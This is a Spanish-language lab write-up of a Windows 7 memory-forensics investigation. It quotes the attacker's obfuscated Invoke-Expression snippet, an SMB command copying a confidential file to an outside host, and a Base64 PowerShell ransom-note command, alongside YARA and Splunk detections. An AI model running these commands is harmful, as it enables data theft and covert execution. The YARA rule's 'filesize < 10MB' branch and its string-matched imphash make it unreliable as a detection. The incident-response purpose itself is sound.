### [HTB-RECOLLECTION: ADVANCED WINDOWS 7 MEMORY FORENSICS REPORT]

**Clasificación:** TLP:AMBER  
**Entorno / Plataforma:** Windows 7 SP1 x64 / Volatility Framework 2.6.1 / HTB Sherlock  
**Objetivo:** Estación de trabajo USER-PC (IP 192.168.0.104)

#### 1. Escenario, Contexto e Identificación del Incidente

- **Resumen Ejecutivo:** Se procesó una imagen de memoria física RAM (recollection.bin, 4.8 GB) obtenida de una estación de trabajo corporativa ejecutando una versión desactualizada de Windows 7 SP1. El análisis forense digital multicapa reveló que el host fue comprometido mediante una combinación de técnicas de ingeniería social, descarga de binarios con nombres maliciosos simulados (typo-squatting), evasión en memoria mediante PowerShell ofuscado y persistencia en consola. El adversario intentó exfiltrar archivos confidenciales hacia un recurso de red SMB externo (\\192.168.0.171\pulice\), depositó notas de extorsión en el perfil público del sistema y ejecutó un artefacto compilado cuya firma criptográfica coincide con un binario malicioso conocido.
    
- **Fuentes de Telemetría y Evidencias:**
    
    - Volcado de memoria RAM física: recollection.bin.
        
    - Herramienta de triaje: Volatility 2.6.1 bajo el perfil de kernel Win7SP1x64.
        
    - Plugins aplicados: imageinfo, pslist, cmdscan, consoles, clipboard, netscan, filescan, dumpfiles y memdump.
        
    - Extracción de artefactos PE mediante pefile en Python 3.
        

#### 2. Mapeo Táctico MITRE ATT&CK®

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica / Subtécnica|Nombre de Técnica|Evidencia Específica Hallada|
|**Defense Evasion**|T1027|Obfuscated Files or Information|Comando ofuscado en portapapeles usando resolución de variables de entorno: (gv '*MDR*').naMe[3,11,2]-joIN''.|
|**Defense Evasion**|T1036.005|Masquerading: Match Legitimate Name|Binario malicioso descargado simulando el proceso de subsistema: csrsss.exe frente al legítimo csrss.exe.|
|**Exfiltration**|T1048.003|Exfiltration Over Alternative Protocol: SMB|Intento de exfiltración de Confidential.txt vía SMB hacia \\192.168.0.171\pulice\pass.txt.|
|**Execution**|T1059.001|Command and Scripting Interpreter: PowerShell|Invocación de PowerShell con payloads codificados en Base64 (-e) para depositar notas de rescate.|
|**Credential Access**|T1552.001|Credentials In Files: Browser Data|Localización en disco del archivo de diccionario passwords.txt dentro de la estructura de Microsoft Edge.|

#### 3. Cadena de Infección y Análisis Forense Detallado

- **Perfil de Memoria:** Identificado mediante el bloque KDBG (0xf80002a3f120L) como **Win7SP1x64**. Procesos clave confirmatorios: explorer.exe, dwm.exe, taskhost.exe.
    
- **Timestamp de Captura de Memoria (UTC):** **2022-12-19 16:07:30 UTC**.
    
- **Configuración de Red y Host:**
    
    - Dirección IP Local: **192.168.0.104** (obtenida mediante netscan).
        
    - Nombre del Host: **USER-PC** (confirmado en el historial de consola de comandos).
        
    - Cuentas de Usuario en el Sistema: **3** cuentas identificadas mediante la ejecución de net users (Administrator, Guest, user).
        

La inspección de la estructura WinSta0 mediante el plugin clipboard capturó un fragmento de código PowerShell depositado en texto plano (CF_UNICODETEXT, Handle 0x6b010d):


``` Powershell
(gv '*MDR*').naMe[3,11,2]-joIN''
```

- **Análisis de Ofuscación:** El comando invoca el alias gv (Get-Variable) buscando un patrón en variables de entorno globales (típicamente $ExecutionContext). Extrae los índices posicionales [3, 11, 2] de la cadena del nombre de la variable, los cuales corresponden a los caracteres I, E, X. Al unirlos mediante -joIN'', reconstruye dinámicamente el alias del cmdlet **Invoke-Expression**, permitiendo la ejecución de payloads en memoria sin registrar la llamada explícita en sistemas de prevención.
    

El volcado de buffers mediante los plugins cmdscan y consoles reveló la actividad en terminales activas:

1. **Comando de Exfiltración:**
    
    
    ``` Cmd
    type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
    ```
    
2. **Evaluación de Éxito:** **NO**. El análisis de la salida de consola en memoria evidenció que la conexión SMB falló con el error del sistema: The network path was not found, confirmando que el recurso de red no estaba alcanzable o el nombre del share era erróneo.
    
3. **Despliegue de Nota de Rescate:**  
    El adversario ejecutó un bloque en Base64 en PowerShell:
    
    
    
    ``` CMD
    powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
    ```
    
    - Decodificación: echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
        
    - Ruta completa del archivo creado: **C:\Users\Public\Office\readme.txt**
        

- **Relación Proceso Padre-Hijo (PPID/PID):**  
    Se detectaron múltiples instancias de PowerShell. La instancia hija con PID 3532 fue instanciada directamente por el intérprete de comandos con PID 4052:
    
    - explorer.exe (PID 2032) -> cmd.exe (PID 4052) -> **powershell.exe (PID 3532)**.
        
    - Proceso Padre: **cmd.exe**.
        
- **Análisis del Malware Ejecutado:**  
    El adversario ejecutó un binario cuyo nombre era su propio hash SHA-256:
    
    - Hash SHA-256 / Nombre: **b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1**
        
    - Extracción y Volcado: Extraído de la memoria mediante dumpfiles -Q 0x11fa45c20.
        
    - **Imphash (Import Hash):** **d3b592cd9481e4f053b5362e22d61595**.
        
    - **Timestamp de Compilación (UTC):** **2022-06-22 11:49:04 UTC** (TimeDateStamp en el IMAGE_FILE_HEADER).
        
- **Typo-Squatting en Descargas:**  
    En filescan, se localizó la descarga de **csrsss.exe** (\Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe...), imitando de forma fraudulenta el binario de subsistema legítimo csrss.exe.
    
- **Ruta del Diccionario de Contraseñas del Navegador:**  
    \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
    

El análisis de cadenas sobre el volcado de memoria del proceso de Microsoft Edge (msedge.exe, PID 2380):

- **Identidad del Actor de Amenaza:** Se detectó la autenticación en Facebook con la cuenta de correo: **mafia_code1337@gmail.com**.
    
- **Solución SIEM Investigada por la Víctima:** La telemetría de navegación (bing.com/search?q=) demostró que la víctima buscó información sobre el SIEM **wazuh**.
    


``` bash 
# Comandos de extracción forense aplicados en Volatility 2
vol.py -f recollection.bin --profile=Win7SP1x64 clipboard
vol.py -f recollection.bin --profile=Win7SP1x64 consoles
vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x11fa45c20 -D ./dumps
python3 -c "import pefile; pe = pefile.PE('malware.exe'); print('Imphash:', pe.get_imphash())"
```

#### 4. Reglas de Detección e Ingeniería de Seguridad


``` Yara
rule Malware_Win7_Recollection_b0ad {
    meta:
        description = "Detecta la muestra maliciosa ejecutada en el incidente Recollection"
        author = "Senior DFIR Specialist"
        date = "2026-10-02"
        hash1 = "b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1"
    strings:
        $imphash = "d3b592cd9481e4f053b5362e22d61595"
        $typo = "csrsss.exe" ascii wide nocase
        $note = "hacked by mafia" ascii wide
    condition:
        uint16(0) == 0x5A4D and (any of ($typo, $note) or filesize < 10MB)
}
```


``` SPL
index=sysmon EventCode=1 
| regex Image=".*\\\\[a-fA-F0-9]{64}\.exe" OR Image=".*\\\\csrsss\.exe"
| stats count, values(CommandLine) as Comandos, values(ParentImage) as Padre by Computer, User, Image
| table Computer, User, Image, Comandos, Padre, count
```

#### 5. Plan de Contención, Erradicación y Hardening

1. **Aislamiento Físico y Lógico del Host:** Desconectar USER-PC (192.168.0.104) de la red interna de forma inmediata.
    
2. **Bloqueo Perimetral de IOCs:**
    
    - Bloquear el tráfico saliente hacia la IP hostil 192.168.0.171.
        
    - Incorporar el hash b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1 a la lista de denegación en EDR/antivirus.
        

3. **Decomiso de Sistemas Fuera de Soporte (EOL):** Retirar y sustituir de forma prioritaria los sistemas operativos Windows 7, carentes de parches de seguridad y de mecanismos modernos de mitigación de kernel (como Virtualization-based Security y RunAsPPL).
    
4. **Restricción de Recursos Administrativos e IPC:** Bloquear mediante directiva el tráfico SMB saliente hacia redes no confiables (puertos TCP 445 y 139).